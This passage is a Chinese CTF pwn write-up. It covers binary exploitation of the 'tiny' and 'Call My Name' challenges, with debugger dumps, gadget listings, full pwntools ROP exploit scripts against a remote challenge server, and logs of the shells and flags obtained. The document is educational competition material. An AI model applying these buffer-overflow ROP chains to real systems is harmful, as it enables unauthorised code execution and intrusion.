[DEBUG] Received 0x4a bytes:
    b'=== calc_beta ===\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x2 bytes:
    b'9\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x40144c\n'
[DEBUG] Received 0x25 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul\n'
[DEBUG] Received 0x1b bytes:
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'10\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x402010\n'
[DEBUG] Received 0x1e bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
[DEBUG] Received 0x22 bytes:
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'11\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x401451\n'
[DEBUG] Received 0x1e bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
[DEBUG] Received 0x22 bytes:
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'12\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x4 bytes:
    b'0x0\n'
[DEBUG] Received 0x24 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul'
[DEBUG] Received 0x1c bytes:
    b'\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'13\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x401456\n'
[DEBUG] Received 0x24 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul'
[DEBUG] Received 0x1c bytes:
    b'\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'14\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x4 bytes:
    b'0x0\n'
[DEBUG] Received 0x1d bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub'
[DEBUG] Received 0x23 bytes:
    b'\n'
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'15\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x401447\n'
[DEBUG] Received 0x1e bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
[DEBUG] Received 0x22 bytes:
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'16\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x5 bytes:
    b'0x3b\n'
[DEBUG] Received 0x24 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul'
[DEBUG] Received 0x1c bytes:
    b'\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'17\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x40145b\n'
[DEBUG] Received 0x25 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul\n'
[DEBUG] Received 0x1b bytes:
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[*] sending payload: b'a'
[DEBUG] Sent 0x1 bytes:
    b'a'
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'demo\n'
    b'entrypoint.sh\n'
demo
entrypoint.sh
$ ls /
[DEBUG] Sent 0x5 bytes:
    b'ls /\n'
[DEBUG] Received 0x5e bytes:
    b'app\n'
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'home\n'
    b'lib\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
app
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2b bytes:
    b'flag{6731c5fa-ae9a-a2cf-c398-3d47393f077e}\n'
flag{6731c5fa-ae9a-a2cf-c398-3d47393f077e}
$
```

```txt
flag{6731c5fa-ae9a-a2cf-c398-3d47393f077e}
```

### 根本没有这种ELF

程序极其小，而且似乎有的地方调用了非法地址，由于与 System V ABI 不匹配 IDA 无法给出伪代码，只能辅助分析汇编。

这个程序应该是手写汇编然后直接编译的，似乎没有链接任何库。

经过分析可以发现程序执行后将前面执行过的内容进行了异或处理，这样会导致 gadget 出现变化。

注意到 0x400169 处程序解密完成，我们使用 pwndbg 运行到此处 dump 程序即可：

```bash
pwndbg> b *0x400169
Breakpoint 1 at 0x400169
pwndbg> c
Continuing.

Breakpoint 1, 0x0000000000400169 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────
*RAX  1
 RBX  0
*RCX  0x42
 RDX  0
*RDI  1
 RSI  0
*R8   0x400125 ◂— 0x68732f6e69622f /* '/bin/sh' */
 R9   0
*R10  0xa
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0
*RSP  0x7fffffffdc18 ◂— 0
*RIP  0x400169 ◂— lea rsi, [rip - 0xcd] /* 0xbaffffff33358d48 */
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────
b► 0x400169    lea    rsi, [rip - 0xcd]     RSI => 0x4000a3 ◂— insb byte ptr [rdi], dx /* 0x7266206f6c6c6548 */
   0x400170    mov    edx, 0x77             EDX => 0x77
   0x400175    call   0x400030                    <0x400030>

   0x40017a    lea    rdi, [rip]                  RDI => 0x400181
   0x400181    and    rdi, 0xfffffffffffff000     RDI => 0x400181 & -0x1000
   0x400188    mov    esi, 0x1000                 ESI => 0x1000
   0x40018d    mov    edx, 5                      EDX => 5
   0x400192    mov    eax, r10d
   0x400195    syscall
   0x400197    call   0x40012d                    <0x40012d>

   0x40019c    xor    rax, rax      RAX => 0
──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc18 ◂— 0
... ↓        5 skipped
06:0030│     0x7fffffffdc48 —▸ 0x400141 ◂— call 0x4001d2 /* 0x480b0f0000008ce8 */
07:0038│     0x7fffffffdc50 ◂— 1
────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0 0x400169
   1 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 rwxp     1000       0 tiny
    0x7ffff7ff7000     0x7ffff7ffb000 r--p     4000       0 [vvar]
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000       0 [vvar_vclock]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000       0 [vdso]
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
pwndbg> dump memory full.bin 0x400000 0x401000
```

当然喜欢 IDA 的也可以使用 IDA 调试。

随后我们分析一下转储程序有什么可用的 gadget：

```bash
❯ ROPgadget --binary full.bin
Gadgets information
============================================================
0x0000000000400004 : add al, byte ptr [rcx] ; add dword ptr [rax], eax ; add byte ptr [rcx + 0x5f], al ; xor ebx, ebx ; ret
0x0000000000400028 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040002a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040002c : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040018f : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x30], al ; syscall
0x00000000004001d5 : add byte ptr [rax], al ; jmp 0x400030
0x0000000000400190 : add byte ptr [rax], al ; mov eax, r10d ; syscall
0x00000000004001be : add byte ptr [rax], al ; mov rdi, rax ; syscall
0x0000000000400007 : add byte ptr [rax], al ; pop r15 ; xor ebx, ebx ; ret
0x000000000040002e : add byte ptr [rax], al ; syscall
0x0000000000400008 : add byte ptr [rcx + 0x5f], al ; xor ebx, ebx ; ret
0x0000000000400191 : add byte ptr [rcx + rcx*4 - 0x30], al ; syscall
0x000000000040018c : add byte ptr [rdx + 5], bh ; mov eax, r10d ; syscall
0x00000000004001ba : add byte ptr [rdx + 9], bh ; mov rdi, rax ; syscall
0x0000000000400006 : add dword ptr [rax], eax ; add byte ptr [rcx + 0x5f], al ; xor ebx, ebx ; ret
0x0000000000400005 : add dword ptr [rcx], eax ; add byte ptr [rax], al ; pop r15 ; xor ebx, ebx ; ret
0x000000000040018e : add eax, 0x44000000 ; mov eax, edx ; syscall
0x00000000004001ce : add esp, 0x30 ; ret
0x00000000004001cd : add rsp, 0x30 ; ret
0x00000000004001d3 : cmp al, 0 ; add byte ptr [rax], al ; jmp 0x400030
0x00000000004001a8 : imul edx, edx, 2 ; syscall
0x00000000004001a4 : ja 0x4001ae ; mov edx, cs ; imul edx, edx, 2 ; syscall
0x0000000000400121 : jle 0x40012d ; pop rax ; ret
0x00000000004001d7 : jmp 0x400030
0x000000000040011f : jns 0x400186 ; jle 0x40012d ; pop rax ; ret
0x00000000004001a3 : lea esi, [rdi + 8] ; mov edx, cs ; imul edx, edx, 2 ; syscall
0x00000000004001a2 : lea rsi, [r15 + 8] ; mov edx, cs ; imul edx, edx, 2 ; syscall
0x00000000004001d2 : mov eax, 0x3c ; jmp 0x400030
0x0000000000400193 : mov eax, edx ; syscall
0x0000000000400192 : mov eax, r10d ; syscall
0x00000000004001c1 : mov edi, eax ; syscall
0x000000000040018d : mov edx, 5 ; mov eax, r10d ; syscall
0x00000000004001bb : mov edx, 9 ; mov rdi, rax ; syscall
0x00000000004001a6 : mov edx, cs ; imul edx, edx, 2 ; syscall
0x00000000004001c0 : mov rdi, rax ; syscall
0x00000000004001bc : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rax ; syscall
0x0000000000400009 : pop r15 ; xor ebx, ebx ; ret
0x0000000000400123 : pop rax ; ret
0x000000000040000a : pop rdi ; xor ebx, ebx ; ret
0x000000000040000d : ret
0x00000000004001a7 : retf 0xd26b
0x00000000004001a9 : rol byte ptr [rdx], cl ; syscall
0x0000000000400030 : syscall
0x00000000004001c9 : test byte ptr [rax + 0x31], -0x2e ; add rsp, 0x30 ; ret
0x00000000004001d0 : xor bl, al ; mov eax, 0x3c ; jmp 0x400030
0x000000000040000b : xor ebx, ebx ; ret
0x00000000004001cb : xor edx, edx ; add rsp, 0x30 ; ret
0x00000000004001c8 : xor esi, esi ; xor rdx, rdx ; add rsp, 0x30 ; ret
0x00000000004001ca : xor rdx, rdx ; add rsp, 0x30 ; ret

Unique gadgets found: 49
```

我们还是筛选一下：

```txt
❯ ROPgadget --binary full.bin | grep "pop rdi"
0x000000000040000a : pop rdi ; xor ebx, ebx ; ret

❯ ROPgadget --binary full.bin | grep "pop rax ; ret"
0x0000000000400121 : jle 0x40012d ; pop rax ; ret
0x000000000040011f : jns 0x400186 ; jle 0x40012d ; pop rax ; ret
0x0000000000400123 : pop rax ; ret
```

这两个 gadget 是 execve 的关键。

```asm
LOAD:0000000000400169
LOAD:0000000000400169                    loc_400169:                             ; CODE XREF: LOAD:00000000004000F9↑j
LOAD:0000000000400169 030 48 8D 35 33 FF                 lea     rsi, loc_4000A1+2
LOAD:0000000000400169 030 FF FF
LOAD:0000000000400170
LOAD:0000000000400170                    loc_400170:                             ; CODE XREF: LOAD:0000000000400102↑j
LOAD:0000000000400170 030 BA 77 00 00 00                 mov     edx, 77h ; 'w'
LOAD:0000000000400175
LOAD:0000000000400175                    loc_400175:                             ; CODE XREF: LOAD:000000000040010C↑j
LOAD:0000000000400175 030 E8 B6 FE FF FF                 call    sub_400030
LOAD:000000000040017A
LOAD:000000000040017A                    loc_40017A:                             ; CODE XREF: LOAD:0000000000400109↑j
LOAD:000000000040017A 030 48 8D 3D 00 00                 lea     rdi, loc_400181
LOAD:000000000040017A 030 00 00
LOAD:0000000000400181
LOAD:0000000000400181                    loc_400181:                             ; DATA XREF: sub_400148:loc_40017A↑o
LOAD:0000000000400181 030 48 81 E7 00 F0                 and     rdi, 0FFFFFFFFFFFFF000h
LOAD:0000000000400181 030 FF FF
LOAD:0000000000400188 030 BE 00 10 00 00                 mov     esi, 1000h
LOAD:000000000040018D 030 BA 05 00 00 00                 mov     edx, 5
LOAD:0000000000400192 030 44 89 D0                       mov     eax, r10d
LOAD:0000000000400195 030 0F 05                          syscall                 ; LINUX -
LOAD:0000000000400197 030 E8 91 FF FF FF                 call    sub_40012D
LOAD:000000000040019C 030 48 31 C0                       xor     rax, rax
LOAD:000000000040019F 030 48 31 FF                       xor     rdi, rdi        ; fd
LOAD:00000000004001A2 030 49 8D 77 08                    lea     rsi, [r15+8]    ; buf
LOAD:00000000004001A6 030 8C CA                          mov     edx, cs
LOAD:00000000004001A8 030 6B D2 02                       imul    edx, 2          ; count
LOAD:00000000004001AB 030 0F 05                          syscall                 ; LINUX - sys_read
LOAD:00000000004001AD 030 48 8D 35 66 FF                 lea     rsi, buf        ; "Goodbye"
LOAD:00000000004001AD 030 FF FF
LOAD:00000000004001B4 030 48 C7 C0 01 00                 mov     rax, 1
LOAD:00000000004001B4 030 00 00
LOAD:00000000004001BB 030 BA 09 00 00 00                 mov     edx, 9          ; count
LOAD:00000000004001C0 030 48 89 C7                       mov     rdi, rax        ; fd
LOAD:00000000004001C3 030 0F 05                          syscall                 ; LINUX - sys_write
LOAD:00000000004001C5 030 31 FF                          xor     edi, edi
LOAD:00000000004001C7 030 48 31 F6                       xor     rsi, rsi
LOAD:00000000004001CA 030 48 31 D2                       xor     rdx, rdx
LOAD:00000000004001CD 030 48 83 C4 30                    add     rsp, 30h
LOAD:00000000004001D1 000 C3                             retn
LOAD:00000000004001D1                    sub_400148      endp
```

```asm
LOAD:0000000000400148 000 48 83 EC 30                    sub     rsp, 30h
```

这里可以看到栈帧大小是 0x30，但是程序试图将 `cs * 2` 大小的内容写入缓冲区。

一般 x64 下Linux 用户态程序段选择子 cs 的值是 0x33，因此这里存在较为严重的溢出。

这里可以找到运行时被异或出来的 `/bin/sh` 以及它的地址：

![](https://img.halfcity.top/2026/11/11/be4c74843ff626edb652744946b2b0b9.avif)

程序在 ret 前执行了 `xor rsi, rsi` `xor rdx, rdx` 将寄存器置 0：

![](https://img.halfcity.top/2026/11/11/c9fc73ef91ffa20da09e9ebcafe3b532.avif)

如此一来我们就可以利用溢出构造 ret2syscall 的 ROP 链了。

exp 如下：

```py
from pwn import *

exe = ELF("./tiny")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 40889)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    offset = 48
    
    pop_rax_ret   = 0x400123   # pop rax ; ret
    pop_rdi_ret   = 0x40000a   # pop rdi ; xor ebx, ebx ; ret
    syscall_ret   = 0x400030   # syscall ; ret
    bin_sh        = 0x400125   # "/bin/sh"
    
    # xor edi, edi ; xor rsi, rsi ; xor rdx, rdx
    payload  = b'A' * offset
    payload += p64(pop_rax_ret) + p64(59)          # rax = 59 (execve)
    payload += p64(pop_rdi_ret) + p64(bin_sh)      # rdi = "/bin/sh"
    payload += p64(syscall_ret)                    # syscall
    
    log.info(f"payload length: {len(payload)} bytes")
    send(payload)
    interactive()

if __name__ == "__main__":
    main()
```

输出如下：

```bash
❯ python exp.py
[*] '/home/halfcity/Desktop/tiny'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
[+] Opening connection to 110.42.112.160 on port 40889: Done
[*] payload length: 88 bytes (max 102)
[*] sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#\x01@\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\n\x00@\x00\x00\x00\x00\x00%\x01@\x00\x00\x00\x00\x000\x00@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x58 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  23 01 40 00  00 00 00 00  3b 00 00 00  00 00 00 00  │#·@·│····│;···│····│
    00000040  0a 00 40 00  00 00 00 00  25 01 40 00  00 00 00 00  │··@·│····│%·@·│····│
    00000050  30 00 40 00  00 00 00 00                            │0·@·│····│
    00000058
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
[DEBUG] Received 0x77 bytes:
    b'Hello from tiny elf ^_^\n'
    b'Some gadgets are hidden :P\n'
    b'There is also a gift for you...\n'
    b'Do you want to say something to me?\n'
Hello from tiny elf ^_^
Some gadgets are hidden :P
There is also a gift for you...
Do you want to say something to me?
[DEBUG] Received 0x9 bytes:
    b'Goodbye~\n'
Goodbye~
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2a bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'tiny\n'
bin
dev
flag
lib
lib32
lib64
libexec
tiny
$ ls /
[DEBUG] Sent 0x5 bytes:
    b'ls /\n'
[DEBUG] Received 0x2a bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'tiny\n'
bin
dev
flag
lib
lib32
lib64
libexec
tiny
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'flag{dYN@mIC-XOR-AnD_HIDDEn_GAdgETs-1ee3a78}\n'
flag{dYN@mIC-XOR-AnD_HIDDEn_GAdgETs-1ee3a78}
$
```

```txt
flag{dYN@mIC-XOR-AnD_HIDDEn_GAdgETs-1ee3a78}
```

### Call My Name

![](https://img.halfcity.top/2026/11/11/87def92b8b830262f5d945f90ce3d4a5.avif)

很扎眼的 system() 函数，让人看到的第一眼就想跳到里面。

![](https://img.halfcity.top/2026/11/11/23393b5b9796446b3103e5f829ae9ed1.avif)

`buf_` 的大小是 0x58，因此这里溢出了 24 个字节，也就是 3 个 QWORD。

检查一下 gadget：

```bash
❯ ROPgadget --binary call_my_name
Gadgets information
============================================================
0x00000000004011bb : add bh, bh ; loopne 0x401225 ; nop ; ret
0x000000000040124b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi - 0x3d], bl ; pop rsi ; ret
0x000000000040118c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040124c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdi ; ret
0x000000000040124d : add byte ptr [rax], al ; add byte ptr [rdi - 0x3d], bl ; pop rsi ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040122a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040118e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040124e : add byte ptr [rax], al ; pop rdi ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040122b : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040124f : add byte ptr [rdi - 0x3d], bl ; pop rsi ; ret
0x0000000000401229 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011ba : add dil, dil ; loopne 0x401225 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040122c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401227 : add eax, 0x2e5b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401292 : add esp, 0x58 ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401291 : add rsp, 0x58 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401243 : cli ; jmp 0x4011d0
0x0000000000401193 : cli ; ret
0x000000000040129b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401240 : endbr64 ; jmp 0x4011d0
0x0000000000401190 : endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004011b5 : je 0x4011c0 ; mov edi, 0x404048 ; jmp rax
0x00000000004011f7 : je 0x401200 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401244 : jmp 0x4011d0
0x000000000040100b : jmp 0x4840103f
0x00000000004011bc : jmp rax
0x00000000004011bd : loopne 0x401225 ; nop ; ret
0x0000000000401226 : mov byte ptr [rip + 0x2e5b], 1 ; pop rbp ; ret
0x00000000004011b7 : mov edi, 0x404048 ; jmp rax
0x00000000004011bf : nop ; ret
0x0000000000401248 : nop dword ptr [rax + rax] ; pop rdi ; ret
0x000000000040123c : nop dword ptr [rax] ; endbr64 ; jmp 0x4011d0
0x00000000004011b6 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x0000000000401294 : pop rax ; ret
0x000000000040122d : pop rbp ; ret
0x0000000000401228 : pop rbx ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401250 : pop rdi ; ret
0x0000000000401254 : pop rdx ; ret
0x0000000000401252 : pop rsi ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040129d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040129c : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040124a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdi ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004011b3 : test eax, eax ; je 0x4011c0 ; mov edi, 0x404048 ; jmp rax
0x00000000004011f5 : test eax, eax ; je 0x401200 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000401156 : xor eax, eax ; add rsp, 8 ; ret

Unique gadgets found: 59
```

这里提取到了几个好用的：

```bash
0x0000000000401250 : pop rdi ; ret
0x0000000000401252 : pop rsi ; ret
0x0000000000401254 : pop rdx ; ret
0x000000000040101a : ret
```

这里几乎就要完成 ret2system 了，但是 `/bin/sh` 无法找到，因此这应该就是题目的蕴意。

要 call 的 这个 name 就是这个字符串。

没有办法不存在我们就只能自己写，要写的话 .bss 段就是很好的目标，没开 PIE 所以地址已知，大小管够。

```asm
LOAD:0000000000404048                    ; ===========================================================================
LOAD:0000000000404048
LOAD:0000000000404048                    ; Segment type: Pure data
LOAD:0000000000404048                    ; Segment permissions: Read/Write
LOAD:0000000000404048                    LOAD            segment mempage public 'DATA' use64
LOAD:0000000000404048                                    assume cs:LOAD
LOAD:0000000000404048                                    ;org 404048h
LOAD:0000000000404048                                    public __TMC_END__
LOAD:0000000000404048 ??                 __TMC_END__     db    ? ;               ; DATA XREF: deregister_tm_clones↑o
LOAD:0000000000404048                                                            ; deregister_tm_clones+5↑o ...
LOAD:0000000000404048                                                            ; Alternative name is '_edata'
LOAD:0000000000404048                                                            ; Alternative name is '__bss_start'
```

.bss 段的起始地点在 0x404048。

随后我们再思考一下 24 个字节的空间绝对是不够的，这里可能需要扩容。

函数返回时 read 的参数填充的非常好，我们只需要修改 rdx 为更大的值然后重新调用 read 我们就可以逆天改命。

随后有了更大的空间我们就可以随意构造 ROP 链了。

修改 rsi 指向 .bss 段，随后调用 read 可以补充好 `/bin/sh` 的来源，之后的 ret 我们就可以补充上 ret2system 的 ROP 链了。

检查一下函数的地址：

```asm
.plt.sec:0000000000401090                    ; ssize_t read(int fd, void *buf, size_t nbytes)
.plt.sec:0000000000401090                    _read           proc near               ; CODE XREF: take_message+2C↓p
.plt.sec:0000000000401090 000 F3 0F 1E FA                    endbr64
.plt.sec:0000000000401094 000 F2 FF 25 8D 2F                 bnd jmp cs:off_404028
.plt.sec:0000000000401094 000 00 00          _read           endp

.plt.sec:0000000000401080                    ; int system(const char *command)
.plt.sec:0000000000401080                    _system         proc near               ; CODE XREF: main+92↓p
.plt.sec:0000000000401080 000 F3 0F 1E FA                    endbr64
.plt.sec:0000000000401084 000 F2 FF 25 95 2F                 bnd jmp cs:off_404020
.plt.sec:0000000000401084 000 00 00          _system         endp
```

exp 如下：

```py
from pwn import *

exe = ELF("./call_my_name")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 40730)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    io.recvuntil(b'tone.')
    
    bss = 0x404048
    
    pop_rdi = 0x401250
    pop_rsi = 0x401252
    pop_rdx = 0x401254
    ret = 0x40101a
    
    read = 0x401090
    system = 0x401080
    
    stage1 = b"A" * 0x58
    stage1 += p64(pop_rdx)
    stage1 += p64(0xF0)
    stage1 += p64(read)
    
    send(stage1)
    
    stage2 = p64(ret) * 14
    stage2 += p64(pop_rsi)
    stage2 += p64(bss)
    stage2 += p64(read)
    stage2 += p64(pop_rdi)
    stage2 += p64(bss)
    stage2 += p64(ret)
    stage2 += p64(system)
    
    stage2 = stage2.ljust(0xF0, b"C")
    
    send(stage2)
    
    stage3 = b"/bin/sh\x00"
    
    send(stage3)
    
    interactive()


if __name__ == "__main__":
    main()
```

注意这里 `stage2 = p64(ret) * 14` 是因为我们不是 syscall 得到的 shell 而是利用 libc 的函数，而我们构造的 ROP 链可能会破坏先前函数的栈帧。导致 system() 内部不会从偏移 0 处返回。

因此这里设置了一个滑跑 ret 确保可以一路滑到 payload。

另外既然都要 ret 了，平栈也可以顺便在这里一并完成，不过我这里还是另外平栈，这样逻辑看起来更正确一点。

此外由于这个参数依赖 libc 版本，在本地我使用 5 测试可以成功，但在远程不行，经测试 14 可以成功。 

输出如下：

```bash
❯ python exp.py
[*] '/home/halfcity/Desktop/call_my_name'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 40730: Done
[DEBUG] Received 0xa5 bytes:
    b'C a l l   M y   N a m e\n'
    b'\n'
    b'The night shift at a retired\n'
    b'telephone exchange.\n'
